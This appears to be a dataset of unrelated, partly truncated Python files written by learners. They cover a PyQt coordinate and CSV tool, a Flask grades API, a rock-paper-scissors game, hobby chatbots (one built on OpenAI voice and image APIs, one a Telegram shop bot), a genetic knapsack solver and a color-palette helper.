* math.sin(theta)) / (111319.9 * math.cos(math.radians(lat)))\r\n        circle_points.append((long + dlon, lat + dlat))\r\n    return circle_points\r\n    \r\ndef dms_to_decimal(dms_str):\r\n    pattern = r\"(\\d+)\u00b0(\\d+)'([\\d.]+)\\\"([NESW])\"\r\n\r\n    match = re.match(pattern, dms_str)\r\n    if not match:\r\n        raise ValueError(f\"INVALID DMS FORMAT {dms_str}\")\r\n        \r\n    degrees, minutes, seconds, direction = match.groups()\r\n    decimal = float(degrees) + float(minutes) / 60 + float(seconds) / 3600\r\n\r\n    if direction in ['S', 'W']:\r\n        decimal = -decimal\r\n    return decimal\r\n\r\n# Drag and drop widget for file selection\r\nclass DragDropWidget(QWidget):\r\n    def __init__(self, title, allow_multiple_files=False, parent=None):\r\n        super(DragDropWidget, self).__init__(parent)\r\n        self.setAcceptDrops(True)\r\n        self.file_paths = []  # Store multiple file paths\r\n        self.allow_multiple_files = allow_multiple_files  # Whether to allow selecting multiple files\r\n\r\n        self.layout = QVBoxLayout()\r\n        self.titleLabel = QLabel(title)\r\n        self.layout.addWidget(self.titleLabel)\r\n\r\n        self.button = QPushButton('Select File(s)')\r\n        self.button.clicked.connect(self.select_file)\r\n        self.layout.addWidget(self.button)\r\n\r\n        self.selectedFilesLabel = QLabel('No file(s) selected')\r\n        self.layout.addWidget(self.selectedFilesLabel)\r\n\r\n        self.setLayout(self.layout)\r\n\r\n    def update_selected_files_label(self):\r\n        if not self.file_paths:\r\n            self.selectedFilesLabel.setText(\"No file(s) selected\")\r\n        else:\r\n            files_str = \"; \".join(os.path.basename(path) for path in self.file_paths)\r\n            self.selectedFilesLabel.setText(f\"Selected file(s): {files_str}\")\r\n\r\n    def dragEnterEvent(self, event):\r\n        if event.mimeData().hasUrls():\r\n            event.acceptProposedAction()\r\n\r\n    def dropEvent(self, event):\r\n        if self.allow_multiple_files:\r\n            self.file_paths = [str(url.toLocalFile()) for url in event.mimeData().urls()]\r\n        else:\r\n            self.file_paths = [str(event.mimeData().urls()[0].toLocalFile())]\r\n        self.update_selected_files_label()\r\n\r\n    def select_file(self):\r\n        if self.allow_multiple_files:\r\n            self.file_paths, _ = QFileDialog.getOpenFileNames(self, 'Select File(s)')\r\n        else:\r\n            file_path, _ = QFileDialog.getOpenFileName(self, 'Select File')\r\n            if file_path:\r\n                self.file_paths = [file_path]\r\n        self.update_selected_files_label()\r\n\r\n\r\n# Window for converting .txt to .csv\r\nclass ConvertTxtToCsvWindow(QDialog):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.setWindowTitle('Convert .txt to .csv')\r\n        self.resize(800, 600)\r\n\r\n        self.layout = QVBoxLayout()\r\n        self.fileWidget = DragDropWidget('Select .txt file here')\r\n        self.layout.addWidget(self.fileWidget)\r\n\r\n        self.convertButton = QPushButton('Convert to CSV')\r\n        self.convertButton.clicked.connect(self.convert_to_csv)\r\n        self.layout.addWidget(self.convertButton)\r\n\r\n        self.setLayout(self.layout)\r\n\r\n    def convert_to_csv(self):\r\n        if self.fileWidget.file_paths:\r\n            input_file_path = self.fileWidget.file_paths[0]\r\n            #input_file_path = self.fileWidget.file_path\r\n\r\n            #this creates the file path\r\n            input_dir, input_file_name = os.path.split(input_file_path)\r\n            new_file_name = \"CSV_\" + input_file_name.replace('.txt', '.csv')\r\n            output_file_path = os.path.join(input_dir, new_file_name)\r\n\r\n            #this will open the txt file and writ",
    "from flask import Flask, jsonify, render_template, abort, request\napp = Flask(__name__)\n\nalunos = {\n   \"1\" : {'nome': 'Eduardo',\n        'nota': [10,9.6,8]},\n   \"2\": {'nome': 'Bianca',\n        'nota': [1,6,4]},\n   \"3\" : {'nome': 'Carlos',\n        'nota': [2,9.6,10]},\n}\n\n\n@app.route('/')\ndef hello():\n    return render_template(\"index.html\")\n        \n@app.route('/alunos')\ndef getAlunos():\n    return jsonify(alunos),200\n\n@app.route('/alunos/<int:indice>')\ndef getAluno(indice):\n    if indice in alunos.keys():\n        return jsonify(alunos.get(indice)),200\n\n    else:\n        return jsonify(\"Pagina n\u00e3o encontrada\", abort(404))\n\n@app.route('/alunos', methods=['POST'])\ndef postAluno():\n    data = request.get_json()\n    if not data:\n        return jsonify({'error': 'Nenhum JSON encontrado no corpo da requisi\u00e7\u00e3o'}), 400\n    \n    indice = data.get('indice')\n    nome = data.get('nome')\n\n    if indice is None or nome is None:\n        return jsonify({'error': '\u00cdndice e nome s\u00e3o campos obrigat\u00f3rios'}), 400\n\n    if indice in alunos:\n        return jsonify({'error': 'Dados n\u00e3o podem ser inseridos, \u00edndice existente'}), 409\n    \n    else:\n        alunos[indice] = {'nome': nome, 'nota': []}\n        return jsonify({'message': 'Dados inseridos com sucesso'}), 200\n    \n@app.route('/notas', methods=['POST'])\ndef postNotas():\n    \n    data = request.get_json()\n    if not data:\n        return jsonify({'error': 'Nenhum JSON encontrado no corpo da requisi\u00e7\u00e3o'}), 400\n    \n    indice = data.get('indice')\n    nota = data.get('nota')\n\n    if indice is None or nota is None:\n        return jsonify({'error': '\u00cdndice e notas s\u00e3o campos obrigat\u00f3rios'}), 400\n\n    if indice in alunos:\n        alunos[indice]['nota'].append(nota)\n        return jsonify({'message': 'Dados inseridos com sucesso'}), 200\n        \n    else:\n        return jsonify({'error': 'Dados n\u00e3o podem ser inseridos, \u00edndice existente'}), 409\n\nif __name__ == '__main__':\n    app.run(debug=True)",
    "import random\nprint(\"This is a simple 'rock paper scissors' game.\")\nprint(\"Let's start!\")\ngametype = None\nwhile gametype != 1 or gametype != 2:\n    gametype = int(input(\"You want to play regular or best of 3? '1' for regular, '2' for best of 3: \"))\n\n\ndef user():  # Get the user's choise\n    userturn = input(\"Enter your choise rock/paper/scissors: \").lower()\n    while userturn not in ['rock', 'paper', 'scissors']:\n        print(\"Invalid choise!\")\n        userturn = input(\"Enter your choise rock/paper/scissors: \").lower()\n    return userturn\n\n\ndef computer():  # Computer's choise\n    computerturn = random.choice([\"rock\", \"paper\", \"scissors\"])\n    return computerturn\n\n\ndef getwinner(userturn, computerturn):  # Get the winner\n    global winner\n    winner = None\n    if (userturn == 'rock' and computerturn == 'scissors') or \\\n       (userturn == 'scissors' and computerturn == 'paper') or \\\n       (userturn == 'paper' and computerturn == 'rock'):\n        print(\"You won!\")\n        winner = \"user\"\n    elif userturn == computerturn:\n        print(\"Nice try, it's a tie!\")\n    else:\n        print(\"You lost!\")\n        winner = \"computer\"\n\n\ndef getgametype():  # Choose the game type\n    if gametype == 1:\n        startgame()\n\n    elif gametype == 2:\n        userwincount = 0\n        pcwincount = 0\n        while userwincount < 2 and pcwincount < 2:\n            startgame()\n            if winner == \"user\":\n                userwincount += 1\n            elif winner == \"computer\":\n                pcwincount += 1\n        else:\n            if userwincount == 2:\n                print(f\"You won! It's {userwincount} - {pcwincount}.\")\n            elif pcwincount == 2:\n                print(f\"You lost! It's {userwincount} - {pcwincount}.\")\n\n\ndef startgame():  # Starting the game\n    userturn = user()\n    computerturn = computer()\n    print(f\"Your choise is {userturn}\")\n    print(f\"Computer choise is {computerturn}\")\n\n    getwinner(userturn, computerturn)\n\n\ngetgametype()\n",
    "import json\r\nfrom difflib import SequenceMatcher\r\n\r\ndef load_knowledge_base(file_path):\r\n    # T\u1ea3i c\u01a1 s\u1edf tri th\u1ee9c t\u1eeb file json\r\n    try:\r\n        with open(file_path, 'r', encoding='utf-8') as file:\r\n            data = json.load(file)\r\n        return data\r\n    except Exception as e:\r\n        print(f\"Kh\u00f4ng th\u1ec3 t\u1ea3i d\u1eef li\u1ec7u: {str(e)}\")\r\n        return None\r\n\r\ndef find_closest_match(input_question, knowledge_base):\r\n    # T\u00ecm c\u00e2u h\u1ecfi g\u1ea7n nh\u1ea5t trong c\u01a1 s\u1edf tri th\u1ee9c so v\u1edbi c\u00e2u h\u1ecfi \u0111\u1ea7u v\u00e0o\r\n    max_ratio = 0\r\n    closest_question = None\r\n    for question in knowledge_base.keys():\r\n        ratio = SequenceMatcher(None, input_question, question).ratio()\r\n        if ratio > max_ratio:\r\n            max_ratio = ratio\r\n            closest_question = question\r\n    return closest_question if max_ratio > 0.6 else None\r\n\r\ndef get_response(question, knowledge_base):\r\n    # L\u1ea5y c\u00e2u tr\u1ea3 l\u1eddi cho c\u00e2u h\u1ecfi t\u1eeb c\u01a1 s\u1edf tri th\u1ee9c\r\n    closest_question = find_closest_match(question, knowledge_base)\r\n    if closest_question:\r\n        return knowledge_base[closest_question]\r\n    else:\r\n        return None\r\n\r\ndef update_knowledge_base(question, answer, knowledge_base):\r\n    # C\u1eadp nh\u1eadt c\u01a1 s\u1edf tri th\u1ee9c v\u1edbi c\u00e2u h\u1ecfi v\u00e0 c\u00e2u tr\u1ea3 l\u1eddi m\u1edbi\r\n    knowledge_base[question] = answer\r\n    with open('knowledge_base.json', 'w', encoding='utf-8') as file:\r\n        json.dump(knowledge_base, file, indent=2)\r\n\r\ndef start_chat(knowledge_base):\r\n    knowledge_base = load_knowledge_base('knowledge_base.json')\r\n    # B\u1eaft \u0111\u1ea7u cu\u1ed9c tr\u00f2 chuy\u1ec7n v\u1edbi bot\r\n    while True:\r\n        user_input = input('B\u1ea1n: ')\r\n        if user_input.lower() == 'quit':\r\n            break\r\n        response = get_response(user_input, knowledge_base)\r\n        if response:\r\n            print(f'Chatbot: {response}')\r\n        else:\r\n            print('Chatbot: T\u00f4i kh\u00f4ng hi\u1ec3u, B\u1ea1n c\u00f3 th\u1ec3 d\u1ea1y cho t\u00f4i kh\u00f4ng?')\r\n            new_answer = input('Nh\u1eadp c\u00e2u tr\u1ea3 l\u1eddi ho\u1eb7c ghi \"skip\" \u0111\u1ec3 b\u1ecf qua: ')\r\n            if new_answer.lower() != 'skip':\r\n                update_knowledge_base(user_input, new_answer, knowledge_base)\r\n                print('Chatbot: C\u1ea3m \u01a1n, T\u00f4i \u0111\u00e3 bi\u1ebft c\u00e1ch tr\u1ea3 l\u1eddi c\u00e2u h\u1ecfi n\u00e0y.')\r\n\r\nif __name__ == '__main__':\r\n    start_chat()  # B\u1eaft \u0111\u1ea7u cu\u1ed9c tr\u00f2 chuy\u1ec7n v\u1edbi bot\r\n\r\n\r\nif __name__ == '__main__':\r\n    knowledge_base = load_knowledge_base('knowledge_base.json')  # T\u1ea3i c\u01a1 s\u1edf tri th\u1ee9c t\u1eeb file 'knowledge_base.json'\r\n    start_chat(knowledge_base)  # B\u1eaft \u0111\u1ea7u cu\u1ed9c tr\u00f2 chuy\u1ec7n v\u1edbi bot\r\n\r\n",
    "\"\"\"\nAuthor: Marina Wooden\nDate: 04-12-2024\nDescription: The chatty cathy bot, which allows you to have a conversation with an ai\nperson.\n\"\"\"\n# speech recognition libs\nimport speech_recognition as sr\nimport io\nimport soundfile as sf\nimport sounddevice as sd\n\n# env vars read\nimport os\nfrom dotenv import load_dotenv\n\n# init chatgpt + whisper + related stufz\nfrom openai import OpenAI\nfrom pathlib import Path\n\n# regex\nimport re\n\n# open image\nimport requests\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom PIL import Image\nfrom io import BytesIO\n\nload_dotenv()\nOPENAI_API_KEY = os.getenv('OPENAI_API_KEY')\n\nopenai_client = OpenAI()\n\n# terminal colors\nclass bcolors:\n    CATHY = '\\u001b[44m'\n    USER = '\\u001b[43m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\nclass Cathy():\n    def __init__(self, role):\n      self.messages = [\n        {\n          \"role\": \"system\",\n          \"content\": f\"\"\"\n            You're Chatty Cathy - an AI friend bot.\n            The user will tell you who they want you to pretend to be,\n            and you'll mimic the speech patterns of that person.\n            Remember to keep it fun and casual!  Your friend wants\n            you to pretend to be {role}\n          \"\"\"\n        }\n      ]\n      self.role = role\n\n      # make photo of subject\n      response = openai_client.images.generate(\n        model=\"dall-e-3\",\n        prompt=f\"Headshot of {role}\",\n        size=\"1024x1024\",\n        quality=\"standard\",\n        n=1,\n      )\n\n      image_url = response.data[0].url\n\n      print(\"Hello! You're talking to Chatty Cathy!\")\n\n    def think(self):\n      # get response from bot\n      cathy_resp = openai_client.chat.completions.create(\n        model=\"gpt-3.5-turbo\",\n        messages=self.messages\n      )\n\n      cathy_resp = cathy_resp.choices[0].message.content\n      print(f\"{bcolors.CATHY}Cathy said:{bcolors.ENDC} {cathy_resp}\")\n      return cathy_resp\n    \n    def say(self, words):\n      self.messages.append({\"role\": \"assistant\", \"content\": words})\n      \n      # response to speech\n      spoken_response = openai_client.audio.speech.create(\n        model=\"tts-1\",\n        voice=\"onyx\",\n        input=words\n      )\n\n      # render speech without saving a file    \n      buffer = io.BytesIO()\n      for chunk in spoken_response.iter_bytes(chunk_size=4096):\n        buffer.write(chunk)\n\n      buffer.seek(0)\n\n      with sf.SoundFile(buffer, 'r') as sound_file:\n        data = sound_file.read(dtype='int16')\n        sd.play(data, sound_file.samplerate)\n        sd.wait()\n\n    def listen(self):\n      r = sr.Recognizer()\n      with sr.Microphone() as source:\n          audio = r.listen(source)\n\n      # recognize speech using Whisper API\n      try:\n        my_resp = r.recognize_whisper_api(audio, api_key=OPENAI_API_KEY)\n        print(f\"{bcolors.USER}You said:{bcolors.ENDC} {my_resp}\")\n\n        # log client message to conversation roster\n        self.messages.append({\"role\": \"user\", \"content\": my_resp})\n\n        # have cathy come up with a response and then play it out\n        cathy_resp = self.think()\n        self.say(cathy_resp)\n\n        # add response to conversation\n        self.messages.append({\"role\": \"assistant\", \"content\": cathy_resp})\n\n        return my_resp\n      except sr.RequestError as e:\n        print(f\"Could not request results from Whisper API; {e}\")\n        return \"Bye-bye.\"\n\ndef main():\n  sys_role = input(\"Who do you want to talk to? \")\n\n  bot = Cathy(sys_role)\n  cathy_resp = bot.think()\n  bot.say(cathy_resp)\n\n  speech = \"\"\n  while not re.match(r'Bye-?bye[!.]?', speech, re.IGNORECASE):\n    speech = bot.listen()\n\n\nif __name__ == '__main__':\n  main()",
    "import numpy as np\nimport random\nfrom collections import deque\n\nLIMITE_MASSA = 200          #Restri\u00e7\u00e3o de massa total que poder\u00e1 ser levada na mochila.\nTAXA_MUTACAO = 0.1          #Percentual de indiv\u00edduos que sofrer\u00e3o muta\u00e7\u00e3o ao ser realizado crossover.\nQUANTIDADE_POPULACAO = 10   #Quantidade de indiv\u00edduos na popula\u00e7\u00e3o.\n\nPONTO_CONVERGENCIA = 300     #Restri\u00e7\u00e3o de converg\u00eancia do algoritmo (se os X \u00faltimos melhores individuos tiverem o mesmo)\n                            #valor da fun\u00e7\u00e3o objetivo, o algoritmo para.\n\nPERCENTUAL_MELHORES = 0.5   #Define qual o percentual em que a popula\u00e7\u00e3o ser\u00e1 dividida entre os melhores\n                            #e os piores.\n\n                            #Caso a popula\u00e7\u00e3o tenha 4 indiv\u00edduos e o percentual seja 0.5 (50%)\n                            #2 indiv\u00edduos ser\u00e3o melhores e 2 piores.\n\n\nclass Item:\n\n    def __init__(self, tipo, massa, valor, quantidade_limite):\n        self.tipo = tipo\n        self.massa = massa\n        self.valor = valor\n        self.quantidade_limite = quantidade_limite\n\n        self.probabilidade_inicial = np.zeros((self.quantidade_limite + 1, 3))\n        self.calcula_probabilidade_inicial()\n\n    def calcula_probabilidade_inicial(self):\n        probabilidade_acumulada = 0\n        probabilidade = 1 / (self.quantidade_limite + 1)\n\n        for qtd in range(self.quantidade_limite + 1):\n            probabilidade_acumulada = probabilidade + probabilidade_acumulada\n            self.probabilidade_inicial[qtd] = [qtd, probabilidade, probabilidade_acumulada]\n\n    def get_qtd_inicial(self):\n        #Randomico para decidir qual ser\u00e1 a quantidade inicial do item com base no probabilidade_inicial.\n        rdn = random.random()\n\n        probabilidades = self.probabilidade_inicial\n\n        for i in range(0, len(probabilidades) + 1):\n            if i == len(probabilidades) - 1:\n                return probabilidades[i][0]\n\n            if probabilidades[i + 1][2] > rdn > probabilidades[i][2]:\n                return probabilidades[i + 1][0]\n\n\nclass Cromossomo:\n\n    def __init__(self):\n        self.item1 = Item(1, 3, 40, 30)\n        self.qtd_item1 = self.item1.get_qtd_inicial()\n\n        self.item2 = Item(2, 5, 100, 20)\n        self.qtd_item2 = self.item2.get_qtd_inicial()\n\n        self.item3 = Item(3, 2, 50, 50)\n        self.qtd_item3 = self.item3.get_qtd_inicial()\n\n        self.probabilidade_acumulada = 0\n\n        self.qtd_item1 = self.item1.get_qtd_inicial()\n        self.qtd_item2 = self.item2.get_qtd_inicial()\n        self.qtd_item3 = self.item3.get_qtd_inicial()\n\n    def set_probabilidade_acumulada(self, probabilidade_acumulada):\n        self.probabilidade_acumulada = probabilidade_acumulada\n\n    def get_probabilidade_acumulada(self):\n        return self.probabilidade_acumulada\n\n    def get_peso_total(self):\n        return (self.item1.massa * self.qtd_item1) + (self.item2.massa * self.qtd_item2) + (\n                    self.item3.massa * self.qtd_item3)\n\n    def get_valor_total(self):\n        return (self.item1.valor * self.qtd_item1) + (self.item2.valor * self.qtd_item2) + (\n                self.item3.valor * self.qtd_item3)\n\n    def get_quantidade_item1(self):\n        return self.qtd_item1\n\n    def get_quantidade_item2(self):\n        return self.qtd_item2\n\n    def get_quantidade_item3(self):\n        return self.qtd_item3\n\n    def set_quantidade_item1(self, quantidade):\n        self.qtd_item1 = quantidade\n\n    def set_quantidade_item2(self, quantidade):\n        self.qtd_item2 = quantidade\n\n    def set_quantidade_item3(self, quantidade):\n        self.qtd_item3 = quantidade\n\n    #Realiza a muta\u00e7\u00e3o de algum gene aleat\u00f3riamente\n    def mutar(self):\n        rnd = random.random()\n        valido = False\n\n        while not valido:\n            if rnd <= 0.3333: #Decide qual gene sofrer\u00e1 muta\u00e7\u00e3o\n                self.qtd_item1 = self.item1.get_qtd_inicial()\n            elif rnd <= 0.6666: #Decide qual gene sofrer\u00e1 muta\u00e7\u00e3o\n                self.qtd_item2 = self.item2.get_qtd_inicial()\n            else: #Decide qual gene sofrer\u00e1 muta\u00e7\u00e3o\n                self.qtd_item3 = self.item3.get_qtd_inicial()\n\n            #Caso o resultado da muta\u00e7\u00e3o for infact\u00edvel, refaz.\n            valido = self.get_peso_total() <= LIMITE_MASSA\n\n\ndef getPopulacao(qtd_individuos):\n    populacao = []\n    individuos_adicionados = 0\n\n    while individuos_adicionados < qtd_individuos:\n        cromossomo = Cromossomo()\n\n        if cromossomo.get_peso_total() <= LIMITE_MASSA:\n            populacao.append(cromossomo)\n            individuos_adicionados += 1\n\n    return populacao\n\n\ndef get_melhor(populacao):\n    melhor: Cromossomo = None\n\n    for individuo in populacao:\n        if melhor is None:\n            melhor = individuo\n        else:\n            if individuo.get_valor_total() > melhor.get_valor_total():\n                melhor = individuo\n\n    return melhor\n\n\ndef cross_over(populacao):\n    #Define qual o % de melhores/piores\n    percentual_por_individuo = 1 / len(populacao)\n    percentual_acumulado = 0\n\n    qt",
    "import telebot\nfrom telebot import types\nfrom telebot.types import ReplyKeyboardMarkup, KeyboardButton\n\nimport database\nimport buttons\n\nTOKEN = 'Your Bot token'\nbot = telebot.TeleBot(TOKEN, threaded=False)\n\nadminnn = #Your_user.id\n\n#hello\n@bot.message_handler(commands=['start'])\ndef start_message(message):\n\n    user = database.check_user(message.from_user.id)\n    if user:\n        bot.send_message(message.from_user.id, f'\u0417\u0434\u0440\u0430\u0441\u0442\u0432\u0443\u0439\u0442\u0435 {message.from_user.first_name}, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u0432 \u043c\u0435\u043d\u044e', reply_markup=buttons.main_menu())\n\n    else:\n        bot.send_message(message.from_user.id, f'\u0417\u0434\u0440\u0430\u0441\u0442\u0432\u0443\u0439\u0442\u0435 {message.from_user.first_name}, \u0447\u0442\u043e \u0431\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0431\u043e\u0442, \u043e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043a\u043d\u043e\u043f\u043a\u0438 \u043d\u0438\u0436\u0435', reply_markup=buttons.contact_button())\n        bot.register_next_step_handler(message, get_contact)\n\n\ndef get_contact(message):\n    telegram_id = message.from_user.id\n\n    if message.contact:\n        phone_number = message.contact.phone_number\n        first_name = message.contact.first_name\n\n        database.register_user(telegram_id, first_name, phone_number)\n\n\n###\n        bot.send_message(telegram_id, '\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043b\u0438\u0441\u044c, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u0432 \u043c\u0435\u043d\u044e', reply_markup=buttons.main_menu()) # menu button\n\n    else:\n        bot.send_message(message.from_user.id, '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \u043a\u043d\u043e\u043f\u043a\u0443 \"\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u043c\u0435\u0440\"', reply_markup=buttons.contact_button()) # phone_button\n        bot.register_next_step_handler(message, get_contact)\n\n\n@bot.message_handler(commands=['admin'])\ndef admin(message):\n    if message.from_user.id == 6833700546:\n        bot.send_message(message.from_user.id, '\u0412\u044b \u0432\u043e\u0448\u043b\u0438 \u0432 \u0430\u0434\u043c\u0438\u043d \u043f\u0430\u043d\u0435\u043b\u044c \u2b05\ufe0f', reply_markup=buttons.admin_menu())\n\n\ndef get_product_to_update(message):\n    if message.text == '\u041d\u0430\u0437\u0430\u0434 \u2b05\ufe0f':\n        bot.send_message(message.from_user.id, '\u0412\u044b \u0432\u0435\u0440\u043d\u0443\u043b\u0438\u0441\u044c \u0432 \u0430\u0434\u043c\u0438\u043d \u043f\u0430\u043d\u0435\u043b\u044c', reply_markup=buttons.admin_menu())\n\n    else:\n        product = message.text\n        bot.send_message(message.from_user.id, '\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0447\u0442\u043e \u0445\u043e\u0442\u0438\u0442\u0435 \u0438\u0437\u043c\u0438\u043d\u0438\u0442\u044c', reply_markup=buttons.admin_update_buttons())\n        bot.register_next_step_handler(message, get_admin_action, product)\n\n\ndef get_admin_action(message, product):\n    action = message.text\n    text = None\n\n    if action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0446\u0435\u043d\u0443':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0446\u0435\u043d\u0443 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0444\u043e\u0442\u043e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0444\u043e\u0442\u043e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u0438\u0434\u0435\u043e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0432\u0438\u0434\u0435\u043e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    bot.send_message(message.from_user.id, text)\n    bot.register_next_step_handler(message, get_new_data, product, action)\n\n\ndef get_new_data(message, product, action):\n    new_data = None\n\n    if message.text:\n        new_data = message.text\n\n    elif message.photo[-1].file_id != None:\n        new_data = message.photo[-1].file_id\n\n    elif message.video.file_id != None:\n        new_data = message.video.file_id\n\n    else:\n        print('error')\n        # bot.send_message(message.from_user.id, 'Invalid name for product')\n        # bot.register_next_step_handler(message, get_admin_action, product, action)\n\n    if action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435':\n        database.update_product_name(product, new_data)\n        bot.send_message(message.from_user.id, '\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435':\n        database.update_product_desc(product, new_data)\n        bot.send_message(message.from_user.id, '\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0446\u0435\u043d\u0443':\n        database.update_product_price(product, new_data)\n        bot.send_message(message.from_user.id, '\u0426\u0435\u043d\u0430 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e':\n        database.update_product_category(product, new_data)\n        bot.send_message(message.from_user.id, '\u041a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0444\u043e\u0442\u043e':\n        database.update_product_photo(product, new_data)\n        bot.send_message(message.from_user.id, '\u0424\u043e\u0442\u043e\u0433\u0440\u0430\u0444\u0438\u044f \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u0438\u0434\u0435\u043e':\n        database.update_product_video(product, new_data)\n        bot.send_message(message.from_user.id, '\u0412\u0438\u0434\u0435\u043e \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n\ndef get_product_name(message, action):\n    name = message.text\n\n    if action == '\u0443\u0434\u0430\u043b\u0438\u0442\u044c':\n\n        database.delete_product(name)\n        bot.send_message(message.from_user.id, '\u041f\u0440\u043e\u0434\u0443\u043a\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0434\u0430\u043b\u0435\u043do', reply_markup=buttons.admin_menu())\n\n    elif action == '\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c':\n        bot.send_message(message.from_user.id, '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430')\n        bot.register_next_step_handler(message, get_product_desc, name)\n\n\ndef get_product_desc(message, name):\n    desc = message.text\n\n    bot.send_message(message.from_user.id, '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0446\u0435\u043d\u0443 \u0442\u043e\u0432\u0430\u0440\u0430 \u0432 \u0441\u0443\u043c\u043c\u0430\u0445!')\n    bot.register_next_step_handler(message, get_product_pr",
    "import numpy as np\nimport matplotlib.colors as mcolors  # Import matplotlib colors\nimport plotly.express as px\n\n\ndef get_distinct_colors(n):\n    \"\"\"Generate n distinct colors, using a cycling method if n exceeds the base palette size.\"\"\"\n    base_colors = px.colors.qualitative.Dark24  # This is a palette of dark colors\n    if n <= len(base_colors):\n        return base_colors[:n]\n    else:\n        # Extend the color palette by repeating and modifying slightly\n        colors = []\n        cycle_count = int(np.ceil(n / len(base_colors)))\n        for i in range(cycle_count):\n            for color in base_colors:\n                modified_color = lighten_color(color, amount=0.1 * i)\n                colors.append(modified_color)\n                if len(colors) == n:\n                    return colors\n    return colors\n\ndef lighten_color(color, amount=0.5):\n    \"\"\"Lighten color by a given amount. Amount > 0 to lighten, < 0 to darken.\"\"\"\n    